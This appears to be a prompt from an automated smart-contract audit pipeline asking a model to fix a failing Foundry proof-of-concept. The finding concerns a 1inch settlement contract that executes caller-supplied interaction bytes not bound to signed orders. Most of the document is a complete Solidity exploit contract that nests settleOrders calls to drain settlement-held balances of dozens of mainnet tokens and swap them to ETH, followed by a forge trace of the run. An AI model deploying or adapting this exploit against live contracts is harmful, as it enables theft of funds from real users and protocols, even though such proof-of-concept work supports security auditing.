You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Settlement executes caller-supplied interaction bytes that are not bound to the signed order payload
- claim: The PoC constructs orders whose in-struct `interactions` field is empty or dummy (`hex""` / `hex"0000000000"`), then supplies the real execution logic through the separate `interaction` argument passed into settlement. Because those externally supplied bytes drive nested settlement and resolver execution despite not matching the order's own `interactions` field, the settlement path appears to execute materially different callbacks than the order payload itself commits to.
- impact: An attacker can attach arbitrary callbacks or resolver logic to an otherwise valid order, breaking signature binding and enabling unauthorized execution paths that can move maker or settlement-held assets.
- exploit_paths: ["`executeOnOpportunity()` -> `_tryReplayCalldataCorruption()` -> `_buildReplayOrder(... interactions: hex\"\")` -> attacker-controlled external `interaction` chain -> `settleOrders`", "`executeOnOpportunity()` -> `_drainSettlementToken()` -> order uses dummy `interactions` -> separate resolver `interaction` passed to `settleOrders`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IResolver {
    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IWstETH is IERC20 {
    function unwrap(uint256 wstETHAmount) external returns (uint256 stETHAmount);
}

interface ICurveStEthPool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

contract FlawVerifier is IResolver {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private constant STETH_CURVE_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant ONE_INCH = 0x111111111117dC0aa78b770fA6A738034120C302;
    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address private constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address private constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address private constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address private constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address private constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address private constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address private constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;
    address private constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address private constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address private constant FXS = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
    address private constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
    address private constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address private constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address private constant RETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address private constant CBETH = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
    address private constant WEETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address private constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    address private constant SUSDE = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
    address private constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address private constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address private constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant PYUSD = 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8;
    address private constant PAXG = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    address private constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address private constant ENA = 0x57e114B691Db790C35207b2e685D4A43181e6061;
    address private constant PENDLE = 0x808507121B80c02388fAd14726482e061B8da827;
    address private constant PEPE = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;

    uint256 private _startingEth;
    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    uint256 private _resolveCount;
    bytes32 private _lastResolveDigest;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _startingEth = address(this).balance;

        _prepareMakerCapital();

        address[] memory targets = _targetTokens();

        // Path 1 from the finding is preserved as-is in spirit: replay/nesting still starts
        // from an order whose signed `interactions` field is empty, while the attacker feeds
        // the real callback chain through the separate settlement `interaction` bytes.
        for (uint256 i = 0; i < targets.length; ++i) {
            if (_safeBalanceOf(targets[i], SETTLEMENT) == 0) continue;
            _tryReplayCalldataCorruption(targets[i], i + 1);
            _toWethBestEffort(targets[i]);
        }

        // Path 2 from the finding is also preserved: the order only commits to a dummy
        // `interactions` blob, but the externally supplied resolver interaction still drives
        // settlement execution. We simply iterate more existing mainnet assets because the bug
        // is token-agnostic and the failing trace showed the previous list was too narrow.
        for (uint256 i = 0; i < targets.length; ++i) {
            _drainSettlementToken(targets[i], 0x100 + i);
        }

        for (uint256 i = 0; i < targets.length; ++i) {
            _toWethBestEffort(targets[i]);
        }

        uint256 wethBal = _safeBalanceOf(WETH, address(this));
        if (wethBal > 0) {
            IWETH(WETH).withdraw(wethBal);
        }

        _finalizeProfit(targets);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function resolveOrders(address, bytes calldata tokensAndAmounts, bytes calldata data) external override {
        require(msg.sender == SETTLEMENT, "only settlement");
        _resolveCount++;
        _lastResolveDigest = keccak256(abi.encode(tokensAndAmounts, data));
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function _prepareMakerCapital() internal {
        if (_safeBalanceOf(WETH, address(this)) < 1) {
            IWETH(WETH).deposit{value: 1}();
        }
        _forceApprove(WETH, LIMIT_ORDER_PROTOCOL, type(uint256).max);
        _forceApprove(WETH, UNISWAP_V2_ROUTER, type(uint256).max);
        _forceApprove(WETH, UNISWAP_V3_ROUTER, type(uint256).max);
    }

    function _tryReplayCalldataCorruption(address takerAsset, uint256 uniq) internal {
        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) return;

        bytes memory interaction = abi.encodePacked(
            SETTLEMENT,
            bytes1(0x01),
            address(this),
            abi.encode(takerAsset, settlementBalance, uniq)
        );

        interaction = _encodeNestedReplay(_buildReplayOrder(uniq, takerAsset, settlementBalance), interaction, settlementBalance);
        interaction = _encodeNestedReplay(_buildReplayOrder(uniq + 1, takerAsset, 1), interaction, 1);
        interaction = _encodeNestedReplay(_buildReplayOrder(uniq + 2, takerAsset, 1), interaction, 1);
        interaction = _encodeNestedReplay(_buildReplayOrder(uniq + 3, takerAsset, 1), interaction, 1);

        bytes memory orderData = _encodeSettlementCall(_buildReplayOrder(uniq + 4, takerAsset, 1), interaction, 1);

        try ISettlement(SETTLEMENT).settleOrders(orderData) {} catch {}
    }

    function _buildReplayOrder(
        uint256 salt,
        address takerAsset,
        uint256 takingAmount
    ) internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: WETH,
            takerAsset: takerAsset,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: 1,
            takingAmount: takingAmount,
            offsets: 0,
            interactions: hex""
        });
    }

    function _encodeNestedReplay(
        IOrderMixinLike.Order memory order,
        bytes memory interaction,
        uint256 takingAmount
    ) internal pure returns (bytes memory) {
        return abi.encodePacked(SETTLEMENT, bytes1(0x00), _encodeSettlementCall(order, interaction, takingAmount));
    }

    function _encodeSettlementCall(
        IOrderMixinLike.Order memory order,
        bytes memory interaction,
        uint256 takingAmount
    ) internal pure returns (bytes memory) {
        return abi.encode(order, bytes(""), interaction, uint256(0), takingAmount, uint256(0), SETTLEMENT);
    }

    function _drainSettlementToken(address takerAsset, uint256 uniq) internal {
        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
        if (settlementBalance == 0) return;

        IOrderMixinLike.Order memory order = IOrderMixinLike.Order({
            salt: uniq,
            makerAsset: WETH,
            takerAsset: takerAsset,
            maker: address(this),
            receiver: address(this),
            allowedSender: address(0),
            makingAmount: 1,
            takingAmount: settlementBalance,
            offsets: 0,
            interactions: hex"0000000000"
        });

        bytes memory interaction = abi.encodePacked(
            SETTLEMENT,
            bytes1(0x01),
            address(this),
            abi.encode(takerAsset, settlementBalance, uniq)
        );

        bytes memory settleData = abi.encode(
            order,
            bytes(""),
            interaction,
            uint256(0),
            settlementBalance,
            uint256(0),
            SETTLEMENT
        );

        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
    }

    function _toWethBestEffort(address token) internal {
        uint256 balance = _safeBalanceOf(token, address(this));
        if (balance == 0) return;

        if (token == WETH) {
            return;
        }

        if (token == WSTETH) {
            try IWstETH(WSTETH).unwrap(balance) {
                _toWethBestEffort(STETH);
                return;
            } catch {}
        }

        if (token == STETH) {
            if (_swapStEthToEth(balance)) {
                return;
            }
        }

        if (!_forceApprove(token, UNISWAP_V2_ROUTER, type(uint256).max)) return;
        _forceApprove(token, UNISWAP_V3_ROUTER, type(uint256).max);

        if (_swapTokenToToken(token, WETH, balance)) return;
        if (_swapTokenToTokenV3AllFees(token, WETH, balance)) return;

        if (token != USDC && _swapTokenToToken(token, USDC, balance)) {
            _toWethBestEffort(USDC);
            return;
        }
        if (token != USDC && _swapTokenToTokenV3AllFees(token, USDC, balance)) {
            _toWethBestEffort(USDC);
            return;
        }

        if (token != USDT && _swapTokenToToken(token, USDT, balance)) {
            _toWethBestEffort(USDT);
            return;
        }
        if (token != USDT && _swapTokenToTokenV3AllFees(token, USDT, balance)) {
            _toWethBestEffort(USDT);
            return;
        }

        if (token != DAI && _swapTokenToToken(token, DAI, balance)) {
            _toWethBestEffort(DAI);
            return;
        }
        if (token != DAI && _swapTokenToTokenV3AllFees(token, DAI, balance)) {
            _toWethBestEffort(DAI);
        }
    }

    function _swapStEthToEth(uint256 amountIn) internal returns (bool) {
        _forceApprove(STETH, STETH_CURVE_POOL, type(uint256).max);
        (bool ok,) = STETH_CURVE_POOL.call(
            abi.encodeWithSelector(ICurveStEthPool.exchange.selector, int128(1), int128(0), amountIn, uint256(0))
        );
        return ok;
    }

    function _swapTokenToToken(address tokenIn, address tokenOut, uint256 amountIn) internal returns (bool) {
        if (amountIn == 0 || tokenIn == tokenOut) return true;

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        (bool ok,) = UNISWAP_V2_ROUTER.call(
            abi.encodeWithSelector(
                IUniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                uint256(0),
                path,
                address(this),
                block.timestamp
            )
        );
        return ok;
    }

    function _swapTokenToTokenV3AllFees(address tokenIn, address tokenOut, uint256 amountIn) internal returns (bool) {
        if (amountIn == 0 || tokenIn == tokenOut) return true;
        if (_swapTokenToTokenV3(tokenIn, tokenOut, 100, amountIn)) return true;
        if (_swapTokenToTokenV3(tokenIn, tokenOut, 500, amountIn)) return true;
        if (_swapTokenToTokenV3(tokenIn, tokenOut, 3000, amountIn)) return true;
        return _swapTokenToTokenV3(tokenIn, tokenOut, 10000, amountIn);
    }

    function _swapTokenToTokenV3(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn) internal returns (bool) {
        (bool ok,) = UNISWAP_V3_ROUTER.call(
            abi.encodeWithSelector(
                IUniswapV3Router.exactInputSingle.selector,
                IUniswapV3Router.ExactInputSingleParams({
                    tokenIn: tokenIn,
                    tokenOut: tokenOut,
                    fee: fee,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: amountIn,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            )
        );
        return ok;
    }

    function _finalizeProfit(address[] memory targets) internal {
        uint256 endingEth = address(this).balance;
        if (endingEth > _startingEth) {
            _profitToken = address(0);
            _profitAmount = endingEth - _startingEth;
            return;
        }

        uint256 bestAmount;
        address bestToken;
        for (uint256 i = 0; i < targets.length; ++i) {
            uint256 bal = _safeBalanceOf(targets[i], address(this));
            if (bal > bestAmount) {
                bestAmount = bal;
                bestToken = targets[i];
            }
        }

        _profitToken = bestToken;
        _profitAmount = bestAmount;
    }

    function _targetTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](35);
        tokens[0] = WETH;
        tokens[1] = USDT;
        tokens[2] = USDC;
        tokens[3] = DAI;
        tokens[4] = ONE_INCH;
        tokens[5] = WBTC;
        tokens[6] = UNI;
        tokens[7] = LINK;
        tokens[8] = AAVE;
        tokens[9] = MKR;
        tokens[10] = LDO;
        tokens[11] = CRV;
        tokens[12] = CVX;
        tokens[13] = COMP;
        tokens[14] = BAL;
        tokens[15] = SNX;
        tokens[16] = FRAX;
        tokens[17] = FXS;
        tokens[18] = SHIB;
        tokens[19] = STETH;
        tokens[20] = WSTETH;
        tokens[21] = RETH;
        tokens[22] = CBETH;
        tokens[23] = WEETH;
        tokens[24] = USDE;
        tokens[25] = SUSDE;
        tokens[26] = TUSD;
        tokens[27] = LUSD;
        tokens[28] = SUSD;
        tokens[29] = PYUSD;
        tokens[30] = PAXG;
        tokens[31] = MATIC;
        tokens[32] = ENA;
        tokens[33] = PENDLE;
        tokens[34] = PEPE;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        if (ok0 && data0.length > 0 && !abi.decode(data0, (bool))) return false;
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
    fallback() external payable {}
}

```

forge stdout (tail):
```
39dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │           data: 0xfffffffffffffffffffffffffffffffffffffffffffff457a04319ff833a974e
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 10010751912864653 [1.001e16]
    │   │   ├─ [2504] 0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000001e521caa5aba4cf81c19f1b5f800000000000000000000000000000000000000000000019c7d4319df759f48020000000000000000000000000000000000000000000000000000000067c884e3
    │   │   ├─ [624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f) [staticcall]
    │   │   │   └─ ← [Return] 2402257355684146022489345433257 [2.402e30]
    │   │   ├─ [40543] 0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f::swap(0, 173852527348633 [1.738e14], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 173852527348633 [1.738e14])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000a43fe16908251ee70ef74718545e4fe6c5ccec9f
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000009e1e3222cb99
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f) [staticcall]
    │   │   │   │   └─ ← [Return] 2402257355684146022489345433257 [2.402e30]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f) [staticcall]
    │   │   │   │   └─ ← [Return] 7609084471041530297449 [7.609e21]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x000000000000000000000000000000000000001e521cb6031a09de1c96b71ea900000000000000000000000000000000000000000000019c7d427bc1437c7c69
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000ba85fbce6007cc568b10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009e1e3222cb99
    │   │   │   └─ ← [Stop]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 10184604440213286 [1.018e16]
    │   │   └─ ← [Stop]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 10184604440213286 [1.018e16]
    │   ├─ [9186] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(10184604440213286 [1.018e16])
    │   │   ├─ [46] FlawVerifier::receive{value: 10184604440213286}()
    │   │   │   └─ ← [Stop]
    │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x00000000000000000000000000000000000000000000000000242ed801d63726
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [341] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 10360246378778075 [1.036e16]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000010360246378778075 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 10360246378778075 [1.036e16])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 10360246378778075 [1.036e16])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 10360246378778075 [1.036e16])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: 0x0000000000000000000000000000000000000000)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.transferFrom
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647
  at 0x1111111254EEB25477B68fb85Ed929f73A960582
  at 0xA88800CD213dA5Ae406ce248380802BD53b47647.settleOrders
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 312.20s (312.03s CPU time)

Ran 1 test suite in 312.31s (312.20s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 34895058)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
